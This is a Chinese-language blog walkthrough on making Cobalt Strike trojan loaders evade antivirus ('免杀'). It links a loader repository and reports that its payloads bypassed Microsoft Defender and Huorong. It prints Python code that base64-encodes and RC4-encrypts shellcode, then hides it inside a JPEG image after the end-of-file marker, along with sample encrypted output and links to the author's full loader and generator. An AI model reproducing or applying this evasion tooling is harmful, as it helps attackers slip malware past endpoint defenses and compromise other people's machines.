---
layout: about
category: about
toc: true
wrench: 2022-03-03
Researchname: CS上线木马免杀入门
desc: 「Cobalt Stike」
author: Bin4xin
permalink: /about/Cobalt-Stike-beacon-bypass-walkthrough/
---

木马上线老生常谈的问题就是免杀；特别是windows免杀，安全市场经过相当长一段时间的洗礼后，国内已然涌现出很多「优秀」的安全软件；

所以本篇来简单聊一下免杀入门，如何快速针对自己的需求做出一个免杀效果还不错的木马；

## 环境

- [Golang Based on Windows](https://go.dev/doc/install)
- [Python Based on Window/Linux/macOS](https://www.python.org/downloads/)
  - pip/pip3
- [CS-Loader](https://github.com/Gality369/CS-Loader.git)

原仓库：

```
origin	https://github.com/Gality369/CS-Loader.git (fetch)
origin	https://github.com/Gality369/CS-Loader.git (push)
```

## 实现

详细过程可以参考[CS-Loader仓库教程](https://github.com/Gality369/CS-Loader/blob/master/README.md#%E4%BD%BF%E7%94%A8)

不做搬运

### 效果

golang版成功通过微软Defender/火绒免杀；

- 火绒

![2022-02-23-1.05.50.png](https://image.yjs2635.xyz/images/2022/02/24/2022-02-23-1.05.50.png)

- 微软Defender

![2022-02-23-1.28.27.png](https://image.yjs2635.xyz/images/2022/02/24/2022-02-23-1.28.27.png)

## 思路

![2022-03-03-10.31.21.png](https://image.yjs2635.xyz/images/2022/03/03/2022-03-03-10.31.21.png)

### 梳理

建议自己尝试一下过程，可以参考上面的README，或者我这里传了一份[梳理过后的代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/CS-Loader.go)

下面看一下tupianshellcode的加密生成方式

### 3x01 图片shellcode生成

```python
#base64encode
baseStr = base64.b64encode(shellcode)
#RC4 + base64encode
payload = rc4(baseStr, key)

with open(imgName, 'rb') as f:
    img = f.read()
    fileend = img[-2:]
    if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
        if(img.count(chr(255)+chr(217))>0):# 不以ffd9结尾，但是内容中包含有ffd9，说明图片有误 或者已经在ffd9后追加过内容了 
            print("Please change the img.")
            exit(0)
        else:
            payload = img + chr(255)+chr(217) + payload
            print("Abnormal end of file, auto add \xff\xd9")
    #以上判断图片的正确性以及进行图片矫正
    else:
        payload = img + payload
        #插入的图片插入经过rc4加密的base64(shellcode)，往下看rc4
    with open("shellcode_"+imgName,'wb') as f1:
        f1.write(payload)
print("Payload has write to shellcode_"+imgName)
```

rc4：

```python
# rc4接收主方法传过来的 (b64encode(shellcode),rc4加密key)
def rc4(text, key):
  key = hashlib.md5(key).hexdigest()
  # Use md5(key) to get 32-bit key instead raw key
  result = ''
  key_len = len(key)
  #1. init S-box
  box = list(range(256))#put 0-255 into S-box
  j = 0
  for i in range(256):#shuffle elements in S-box according to key
      j = (j + box[i] + ord(key[i%key_len]))%256
      #取模
      box[i],box[j] = box[j],box[i]#swap elements
  i = j = 0
  for element in text:
      i = (i+1)%256
      j = (j+box[i])%256
      box[i],box[j] = box[j],box[i]
      k = chr(ord(element) ^ box[(box[i]+box[j])%256])
      result += k
  # bla bla bla..    
  result = base64.b64encode(result)
  return result
```
加密效果：

```bash
# python generator.py
ADdk943ZPviJWuFP5HO6HsUbbf3/UibLBKbjBQNvx314kU2L8vjUSpdIwV/cx20/2W0Skzghdf4oYRZfF1/0P+xhSgYqRXESzhXpqoLHXiVzDyezyOp9p03A
s6I3lXCP9w9r+CBG5VQIg3sCak05aAG1rRAoAD8L7FbzFQCbnhn+BgKe4A7J95vKyGzmFBuNiQoBqOEbNKNuF6oaXbsDTw6s9ymflG7yna8Os9zOOS4JSFZ5
Ds4slcQ6pFHZK16OERLSN9x8hdjlLVKUKqTmPhl1Y3hepr2nF5G/NkS6esZTEsEJHRPcXpQineKVL/T5uxoliiLOeZdjlrGgnDGrgMC5N8O66DXyK3bGdYpV
Mrzj9iQzCwdXn0PdquAhAZynjtos1c6S4De9EVxbJaes6k/QeCjrkD234qPTt5c4C8zm/bhrZ0ghVAAl4LPwiPZsu5bYONMeYApBJ81IBec46RSFFN5LWzdh
JEutJDx9w/AyYS1iphRShAczz6GmeVDaXeY83LhzKNKMlXNJfVv57DFDX4MiKiZq4SO5roUkUQ1mTYCG3LzdTFDhC7JQdwML2WBwubnPt8kCs6woxC0P2y5e
An77KivDovGsB3INBxqErgonfKWPgcCJVixYBfRP7FxfBYoAjw9xiiLuwDOxQaYAKGAfPI/9ctphRPWa8ZPzaJ7fpF4dO8UERVh0/IYlgeJx9hLVvEkjf9O0
y1O688E1Giuo+D8pgdZo4WnsTWNBfU+woqo/34ZzxHV/3xKFlKljBD0+XoyKTLYmUju6pwv5TEfBbiMd+Hrs5Oh9s0fkKOyybuhrCEX8zrpMHcNhng996olY
zcKNxCoZzDuFFvDwGkX3vXNN+GWTgKZc6lnp+hrX2Z0ZDaivLVyZU2NCS6YBq7BjEgntO2oYWlRiUXUKejHysunVUVE4LPtiO6nAJXTELd3SAXG8G4Sy5RjD
K3c0GaAjvaeJ0//TpFecPPvMOJCukvvwoUTziex5cQ8Q+C6TwQKlO0zgHdXHALfkkSroBBGmqGZjqdCgaTTKHKOoAC9STz83g6jsI//Jpkjfwc3Avp75u1/4
dswHjJk73Ncl9VMXxvMAVFqHzFM1+zuDQo74fw1DLwwXMLDoBuBgD5kf5emmhgDtFRDO5FofOlhQ4L06vNgGJw7s1D1b76YWmY6xv5Uk1IvTYqn8cb4bFzHr
QgwuhPcBpITJ7Q7Wu7HZhlLkfKLor7kso4fn0gDUv258Q1MDelXWABmdlkzYSKOUOnsRUTi2hSI65Wy9GgL6IAyMx6vo/iwuKlYlkBafqPjFNY2O3LhVgTYr
xmC8y7oXHnBR23wFNrNXlvtct/B8xIL8hiPA4rVcpK2ouPacFZYbdjS74JUdHwKMv5lAC3UpmoevzCQzcze0R03R5p6ZHgvjLxuqKFBkKSgHrAbivLnMEPDX
zK3UeKSvG2ftsZiXPCPMZTjD0jBti4ubHc++RzHVC+Zq6ioj3nXjifF2FoJcnPGcdKkYHZBZlL6X5ptXxsT2FFtUTgZYD+iBnS4UlmTdK/oKNsds+ma8E1iB
v4K04P83bSIgvunvA/xFX3N6u0m5qevZemY+RTsynSjPrg==
#看起来像base64，实际上无法反编码

$ python 1.py |base64 -d
7d��>�Z�O�s����R&���o�}x�M����J�H�_��m?�m�8!u�(a__�?�aJ*Eq�骂�^%s'���}�M���7�p��k� F��{jM9h��(?
...

```

实际上，我们在做渗透的时候也可以发现这样类似的加密算法，代码我也放到了[Bigger仓库::generator.py](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/generator.py)，当然具体问题具体分析，权当抛砖引玉；

以上。